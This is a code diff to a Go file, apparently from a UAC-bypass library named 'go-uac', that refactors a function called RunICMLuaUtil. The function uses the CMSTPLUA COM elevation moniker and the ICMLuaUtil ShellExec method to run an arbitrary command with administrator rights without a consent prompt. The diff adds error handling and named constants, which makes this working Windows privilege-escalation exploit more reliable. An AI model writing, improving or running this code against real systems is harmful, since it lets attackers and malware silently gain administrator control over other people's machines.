@@ -1,29 +1,37 @@
 package method
 
 import (
+	"fmt"
 	"go-uac/ole"
 	"syscall"
 )
 
 func RunICMLuaUtil(szCmd string) error {
-	ole.CoInitializeEx(0, 2)
+	if hr := ole.CoInitializeEx(0, 2); hr.IsFailed() {
+		return hr
+	}
 	defer ole.CoUninitialize()
 
 	bindOpts := &ole.BIND_OPTS3{
 		ClassContext: 4,
 	}
 
-	icm, err := ole.CoGetObject[*ole.ICMLuaUtil](
-		"Elevation:Administrator!new:{3e5fc7f9-9a51-4367-9063-a120244fbec7}",
+	icm, hr := ole.CoGetObject[*ole.ICMLuaUtil](
+		fmt.Sprintf("Elevation:Administrator!new:%s", ole.CLSID_CMSTPLUA),
 		bindOpts,
-		ole.NewGUID("{6edd6d74-c007-4e75-b76a-e5740995e24c}"),
+		ole.IID_ICMLuaUtil,
 	)
 
-	if err.IsFailed() {
-		return err
+	if hr.IsFailed() {
+		return hr
 	}
 
 	defer icm.Release()
 
-	return icm.ShellExec([]byte(szCmd), nil, nil, 0, syscall.SW_SHOW)
+	lpFile, err := syscall.UTF16PtrFromString(string(szCmd))
+	if err != nil {
+		return err
+	}
+
+	return icm.ShellExec(lpFile, nil, nil, 0, syscall.SW_SHOW)
 }
